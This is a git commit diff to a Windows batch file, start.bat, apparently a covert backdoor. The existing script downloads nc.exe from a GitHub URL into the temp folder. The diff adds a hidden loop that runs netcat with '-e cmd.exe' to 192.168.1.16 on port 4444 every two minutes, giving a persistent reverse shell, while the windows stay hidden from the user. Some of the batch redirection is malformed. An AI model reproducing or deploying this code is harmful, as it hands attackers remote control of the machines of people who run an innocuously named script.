b8aaed7728f431d7acfdcc6012286872527894c5
Omar Samy <osamy7592@gmail.com>
2024-06-02 15:00:57 +0300

    Update start.bat

--- start.bat
+++ start.bat
@@ -3,5 +3,9 @@ set "batFilePath=%temp%\pro.bat"
 if not exist "%batFilePath%" (
     echo @echo off > "%batFilePath%"
     curl https://raw.githubusercontent.com/omarsamyX0/shell4/main/nc.exe -o %temp%\nc.exe >> "%batFilePath%"
+    :loop >> "%batFilePath%"
+        powershell -c "Start-Process -FilePath 'cmd.exe' -ArgumentList '/c %temp%\nc.exe -nv 192.168.1.16 4444 -e cmd.exe' -WindowStyle Hidden" >> "%batFilePath%"
+        timeout /t 120 >nul >> "%batFilePath%"
+    goto loop >> "%batFilePath%"
 )
 powershell -WindowStyle Hidden -Command "Start-Process -FilePath \"%temp%\pro.bat\" -WindowStyle Hidden"
